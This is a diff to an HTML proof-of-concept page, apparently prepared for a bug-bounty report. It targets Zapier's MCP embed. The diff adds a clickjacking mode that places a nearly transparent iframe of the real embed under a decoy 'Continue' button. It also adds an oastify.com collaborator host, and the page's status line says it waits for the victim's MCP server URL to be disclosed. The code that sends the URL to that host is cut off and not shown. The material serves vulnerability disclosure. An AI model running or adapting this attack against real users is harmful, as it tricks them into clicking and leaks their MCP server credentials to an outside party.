@@ -1,18 +1,44 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>Zapier MCP Embed cross-tenant PoC</title>
+<style>
+  body { font: 16px system-ui, sans-serif; margin: 24px; }
+  #stage { position: relative; width: 640px; max-width: 100%; height: 720px; overflow: hidden; border: 1px solid #bbb; background: #fff; }
+  #embed { display: block; width: 640px; height: 720px; border: 0; background: #fff; }
+  #cover { display: none; position: absolute; inset: 0; pointer-events: none; background: #fff; }
+  #decoy { position: absolute; left: var(--target-x); top: var(--target-y); transform: translate(-50%, -50%); padding: 14px 24px; border: 0; border-radius: 7px; color: #fff; background: #503eb6; font: 600 16px system-ui, sans-serif; box-shadow: 0 2px 8px #0003; }
+  body.clickjack #embed { position: absolute; left: var(--frame-x); top: var(--frame-y); opacity: var(--frame-opacity); z-index: 2; }
+  body.clickjack #cover { display: block; z-index: 3; }
+  body.clickjack #decoy { z-index: 4; }
+</style>
 <h1>Zapier MCP Embed cross-tenant PoC</h1>
-<p>Open this page while the victim MCP session is available to third-party frames.</p>
+<p id="mode"></p>
 <pre id="status">Waiting for the embed to disclose the victim MCP server URL...</pre>
-<iframe
-  src="https://mcp.zapier.com/embed?embedId=96e091d4-559c-4bcd-baff-c1b9cfcec23b"
-  title="Zapier MCP Embed"
-  width="640"
-  height="720"
-  style="display:block;width:640px;max-width:100%;height:720px;border:1px solid #bbb;background:#fff"
-></iframe>
+<div id="stage">
+  <!-- Triager: replace this researcher embed ID with your own embed ID before testing. -->
+  <iframe id="embed" src="https://mcp.zapier.com/embed?embedId=96e091d4-559c-4bcd-baff-c1b9cfcec23b" title="Zapier MCP Embed"></iframe>
+  <div id="cover"><button id="decoy" tabindex="-1">Continue</button></div>
+</div>
 <script>
-const COLLABORATOR = 'zdgqz1w5w2xebgx8pzp37ao29tfk3br0.oastify.com';
+// Triager: replace this researcher Collaborator hostname with your own Burp Collaborator hostname.
+const COLLABORATOR = 'g3k7pimmmjnv1xnpfgfkxrejza51tthi.oastify.com';
+const query = new URLSearchParams(location.search);
+const selectedMode = query.get('mode') === 'clickjack' ? 'clickjack' : 'static';
+const numberParam = (name, fallback) => {
+  const value = Number(query.get(name));
+  return Number.isFinite(value) ? value : fallback;
+};
+
+document.body.classList.toggle('clickjack', selectedMode === 'clickjack');
+document.body.style.setProperty('--frame-x', `${numberParam('frameX', 0)}px`);
+document.body.style.setProperty('--frame-y', `${numberParam('frameY', 0)}px`);
+document.body.style.setProperty('--target-x', `${numberParam('targetX', 320)}px`);
+document.body.style.setProperty('--target-y', `${numberParam('targetY', 360)}px`);
+document.body.style.setProperty('--frame-opacity', String(numberParam('opacity', 0.08)));
+document.getElementById('mode').textContent = selectedMode === 'clickjack'
+  ? 'Clickjacking test mode. Align the real Zapier button beneath Continue with frameX/frameY and targetX/targetY query parameters. Start with opacity=0.5, then lower it after alignment.'
+  : 'Static mode. The complete 640×720 Zapier embed is visible. Use ?mode=clickjack to test the overlay mode.';
+
 const status = document.getElementById('status');
 let sent = false;
 
